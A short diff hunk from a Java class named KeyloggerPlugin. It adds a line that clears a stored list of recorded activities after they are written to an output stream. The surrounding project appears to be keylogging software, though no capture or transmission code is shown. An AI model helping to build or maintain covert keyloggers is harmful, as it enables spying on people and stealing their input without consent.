@@ -155,6 +155,8 @@ public class KeyloggerPlugin extends StubPlugin {
 							}
 						}
 						
+						Activities.activities.clear();
+						
 						out.close();
 					} catch (Exception e) {
 						e.printStackTrace();
